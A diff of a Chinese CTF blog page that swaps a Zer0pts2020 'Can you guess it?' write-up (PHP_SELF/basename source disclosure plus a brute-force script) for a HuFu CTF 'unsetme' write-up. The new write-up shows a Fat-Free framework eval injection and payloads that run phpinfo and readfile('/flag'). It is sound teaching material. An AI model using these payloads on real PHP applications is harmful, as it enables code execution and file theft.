@@ -20,25 +20,30 @@
     var CONFIG = {"hostname":"www.plasf.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="源码：&amp;lt;?php include &amp;#39;config.php&amp;#39;; // FLAG is defined in config.php  if (preg_match(&amp;#39;/config\.php\/*$/i&amp;#39;, $_SERVER[&amp;#39;PHP_SELF&amp;#39;])) {   exit(&amp;quot;I don&amp;#39;t know what you are thi">
-<meta name="keywords" content="WriteUp">
+  <meta name="description" content="unsetme题目直接给出源码：  &amp;lt;?php // Kickstart the framework $f3=require(&amp;#39;lib/base.php&amp;#39;);  $f3-&amp;gt;set(&amp;#39;DEBUG&amp;#39;,1); if ((float)PCRE_VERSION&amp;lt;8.0)     trigger_error(&amp;#39;PCRE version is out o">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Zer0pts2020-Can you guess it?">
-<meta property="og:url" content="https://www.plasf.cn/articles/d4f73bcb62.html">
+<meta property="og:title" content="虎符unsetme Write Up">
+<meta property="og:url" content="https://www.plasf.cn/articles/hfctfunsetme.html">
 <meta property="og:site_name" content="Xiao Leung&#39;s Blog">
-<meta property="og:description" content="源码：&amp;lt;?php include &amp;#39;config.php&amp;#39;; // FLAG is defined in config.php  if (preg_match(&amp;#39;/config\.php\/*$/i&amp;#39;, $_SERVER[&amp;#39;PHP_SELF&amp;#39;])) {   exit(&amp;quot;I don&amp;#39;t know what you are thi">
+<meta property="og:description" content="unsetme题目直接给出源码：  &amp;lt;?php // Kickstart the framework $f3=require(&amp;#39;lib/base.php&amp;#39;);  $f3-&amp;gt;set(&amp;#39;DEBUG&amp;#39;,1); if ((float)PCRE_VERSION&amp;lt;8.0)     trigger_error(&amp;#39;PCRE version is out o">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png">
-<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png">
-<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png">
-<meta property="og:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png">
-<meta property="og:updated_time" content="2020-10-14T09:25:58.647Z">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210403-201113@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-201457@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-202815@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-203036@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-203421@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-205303@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-201957@2x.png">
+<meta property="og:image" content=" https://goodcheerleung.gitee.io/macpic/WX20210403-205529@2x.png">
+<meta property="og:image" content="https://goodcheerleung.gitee.io/macpic/WX20210403-205651@2x.png">
+<meta property="og:updated_time" content="2021-04-04T03:47:00.021Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Zer0pts2020-Can you guess it?">
-<meta name="twitter:description" content="源码：&amp;lt;?php include &amp;#39;config.php&amp;#39;; // FLAG is defined in config.php  if (preg_match(&amp;#39;/config\.php\/*$/i&amp;#39;, $_SERVER[&amp;#39;PHP_SELF&amp;#39;])) {   exit(&amp;quot;I don&amp;#39;t know what you are thi">
-<meta name="twitter:image" content="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png">
+<meta name="twitter:title" content="虎符unsetme Write Up">
+<meta name="twitter:description" content="unsetme题目直接给出源码：  &amp;lt;?php // Kickstart the framework $f3=require(&amp;#39;lib/base.php&amp;#39;);  $f3-&amp;gt;set(&amp;#39;DEBUG&amp;#39;,1); if ((float)PCRE_VERSION&amp;lt;8.0)     trigger_error(&amp;#39;PCRE version is out o">
+<meta name="twitter:image" content="https://goodcheerleung.gitee.io/macpic/WX20210403-201113@2x.png">
 
-<link rel="canonical" href="https://www.plasf.cn/articles/d4f73bcb62.html">
+<link rel="canonical" href="https://www.plasf.cn/articles/hfctfunsetme.html">
 
 
 <script id="page-configurations">
@@ -51,7 +56,7 @@
   };
 </script>
 
-  <title>Zer0pts2020-Can you guess it? | Xiao Leung's Blog</title>
+  <title>虎符unsetme Write Up | Xiao Leung's Blog</title>
   
 
 
@@ -214,7 +219,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d4f73bcb62.html">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/hfctfunsetme.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/header.jpg">
@@ -227,7 +232,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Zer0pts2020-Can you guess it?
+          虎符unsetme Write Up
         </h1>
 
         <div class="post-meta">
@@ -236,24 +241,9 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-05-20 15:56:40" itemprop="dateCreated datePublished" datetime="2020-05-20T15:56:40+08:00">2020-05-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:25:58" itemprop="dateModified" datetime="2020-10-14T17:25:58+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
+              <time title="创建时间：2021-04-04 11:46:40 / 修改时间：11:47:00" itemprop="dateCreated datePublished" datetime="2021-04-04T11:46:40+08:00">2021-04-04</time>
             </span>
 
           <br>
@@ -262,7 +252,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -281,46 +271,71 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><pre><code class="php">&lt;?php
-include &#39;config.php&#39;; // FLAG is defined in config.php
+        <h1 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h1><p>题目直接给出源码：</p>
+<pre><code class="php"> &lt;?php
+// Kickstart the framework
+$f3=require(&#39;lib/base.php&#39;);
 
-if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
-  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
-}
+$f3-&gt;set(&#39;DEBUG&#39;,1);
+if ((float)PCRE_VERSION&lt;8.0)
+    trigger_error(&#39;PCRE version is out of date&#39;);
+// Load configuration
+highlight_file(__FILE__);
+$a=$_GET[&#39;a&#39;];
+unset($f3-&gt;$a);
+$f3-&gt;run();</code></pre>
+<p>源码和WMCTF中的一个框架反序列化是同一个框架，网上下载源码来测试一下：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210403-201113@2x.png" alt="WX20210403-201113@2x"></p>
+<p>发现<code>/lib/base.php</code>533行有一处eval报错，跟进发现<code>$val</code>是由<code>$hive</code>属性得到。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-201457@2x.png" alt="WX20210403-201457@2x" style="zoom:33%;">
 
-if (isset($_GET[&#39;source&#39;])) {
-  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
-  exit();
-}
+<p>可以很明显发现<code>$val</code>由<code>$key</code>拼接<code>@hive</code>进过正则匹配过滤后再进行替换得到，我们继续跟进<code>$key</code>会发现他来源于<code>__unset</code>魔术方法。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-202815@2x.png" alt="WX20210403-202815@2x" style="zoom:33%;">
 
-$secret = bin2hex(random_bytes(64));
-if (isset($_POST[&#39;guess&#39;])) {
-  $guess = (string) $_POST[&#39;guess&#39;];
-  if (hash_equals($secret, $guess)) {
-    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
-  } else {
-    $message = &#39;Wrong.&#39;;
-  }
-}
-?&gt;</code></pre>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从源码得知flag在config.php中的一个常量中，要得到flag需要我们post一个值guess和随机生成的要预测和爆破基本没戏。但是可以发现 <code>highlight_file()</code> 里面的变量是可控的。那么我们可以看看<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code> 怎么才能得到我们想要的结果。我们从php.net可以得知：</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png" alt="微信图片_20200520150428"></p>
-<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 能够当前url的路径，而basename能够返回返回路径中文件名部分。</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png" alt="微信截图_20200520154155"></p>
-<p>那我们不是可以传入<code>/index.php/config.php?souce</code> ？但是一条正则挡住了我们的去路：</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png" alt="微信截图_20200520154339"></p>
-<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p>我们还需要绕过</p>
-<pre><code class="php">preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></pre>
-<p>这种正则其实直接写个脚本去爆破即可，一般都是某个字符能够通过。</p>
-<pre><code class="python">import requests
+<p><code>__unset</code>这个魔术方法会在外部使用<code>unset()</code>函数销毁类的属性时候被触发。正好咱们回到·<code>index.php</code>就使用<code>unset</code>来销毁属性。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-203036@2x.png" alt="WX20210403-203036@2x" style="zoom:25%;">
 
-for i in range(0,255):
-    url=&quot;http://c3bedc5a-4535-41a4-9c5f-9a25eae15489.node3.buuoj.cn/index.php/config.php/%s?source&quot;%(chr(i))
-    r = requests.get(url)
-    if &#39;flag&#39; in r.text:
-        print(r.text)
-</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png" alt="微信截图_20200520154931"></p>
+<p>也就是说<code>$key</code>就是<code>$_GET[&#39;a&#39;]</code>,测试发现<code>$this-&gt;compile</code>会将<code>key</code>替换为<code>[&#39;   &#39;]</code>包裹下。这就说明我们需要绕过这个规格才能执行任意代码。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-203421@2x.png" alt="WX20210403-203421@2x" style="zoom:33%;">
+
+<p>我们跟进<code>$this-&gt;compile</code>方法，由于参数2传入就是false咱们直接进入第一个分支。可以看到分支使用<code>preg_replace_callback</code>进行了两次匹配替换。第一次匹配将<code>hive</code>匹配到然后在前面拼接<code>$</code>得到<code>$hive</code>第二次就是把我们传入的字符串给匹配进去，然后用<code>[&#39;   &#39;]</code>包裹起来，但是<code>[]</code>并不会被匹配进去。因此咱么可以利用这个特性逃逸，只要写入一个二维数组就行了。</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-205303@2x.png" alt="WX20210403-205303@2x" style="zoom:33%;">
+
+<pre><code class="php">function compile($str, $evaluate=TRUE) {
+        return (!$evaluate)
+            ? preg_replace_callback(
+                &#39;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#39;,
+                function($expr) {
+
+                    $str=&#39;$&#39;.$expr[1];
+                    if (isset($expr[2]))
+                        $str.=preg_replace_callback(
+                            &#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;,
+                            function($sub) {
+                                $val=isset($sub[2]) ? $sub[2] : $sub[1];
+                                if (ctype_digit($val))
+                                    $val=(int)$val;
+                                $out=&#39;[&#39;.$this-&gt;export($val).&#39;]&#39;;
+
+                                return $out;
+                            },
+                            $expr[2]
+                        );
+
+                    return $str;
+                },
+                $str
+            )
+      ....
+      略</code></pre>
+<p>那么哪里有二维数组呢，当然是在<code>hive</code>属性里找，直接将其输出看到很多</p>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-201957@2x.png" alt="WX20210403-201957@2x" style="zoom:33%;">
+
+<p>因此构造payload如下：</p>
+<pre><code>?a=JAR[&#39;expire&#39;]);phpinfo(</code></pre><img src=" https://goodcheerleung.gitee.io/macpic/WX20210403-205529@2x.png" alt="WX20210403-205529@2x" style="zoom: 25%;">
+
+<p>直接读flag即可：</p>
+<pre><code>?a=JAR[&#39;expire&#39;]);readfile(&#39;/flag&#39;</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WX20210403-205651@2x.png" alt="WX20210403-205651@2x"></p>
 
     </div>
 
@@ -330,7 +345,7 @@ for i in range(0,255):
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
           </div>
 
         
@@ -339,13 +354,10 @@ for i in range(0,255):
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/articles/d5850ed2ae.html" rel="prev" title="Hard_Pentest_1 复现">
-      <i class="fa fa-chevron-left"></i> Hard_Pentest_1 复现
+    <a href="/articles/ezsqliwp.html" rel="prev" title="Easysqli WriteUp（我TM烦死了）">
+      <i class="fa fa-chevron-left"></i> Easysqli WriteUp（我TM烦死了）
     </a></div>
-      <div class="post-nav-item">
-    <a href="/articles/d729d7601d.html" rel="next" title="内网渗透学习笔记">
-      内网渗透学习笔记 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -404,7 +416,7 @@ for i in range(0,255):
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#源码："><span class="nav-number">1.</span> <span class="nav-text">源码：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正则绕过"><span class="nav-number">3.</span> <span class="nav-text">正则绕过</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#unsetme"><span class="nav-number">1.</span> <span class="nav-text">unsetme</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
